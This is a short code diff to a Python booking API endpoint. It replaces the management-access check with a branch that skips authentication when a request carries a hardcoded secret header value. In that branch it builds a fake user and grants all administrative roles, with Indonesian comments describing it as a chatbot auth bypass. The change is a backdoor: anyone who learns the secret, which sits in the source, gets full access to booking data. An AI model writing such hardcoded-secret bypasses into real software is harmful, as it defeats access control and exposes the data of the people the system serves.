@@ -490,7 +490,12 @@ def read_all_bookings_by_month_api(
     db: Session = Depends(get_db),
     current_user: usersSchema.User = Depends(usersController.get_current_active_user_from_cookie)
 ):
-    user_roles = check_management_access(db, current_user)
+    # BYPASS AUTH KHUSUS CHATBOT
+    if request.headers.get("X-Chatbot-Secret") == "umnfti2025gacor":
+        current_user = type('obj', (object,), {'nid': 1, 'vemail': 'chatbot@umn.ac.id'})  # fake user
+        user_roles = {"SA", "ADM", "PIC"}  # kasih semua akses
+    else:
+        user_roles = check_management_access(db, current_user)
     
     try:
         _, num_days = calendar.monthrange(year, month)
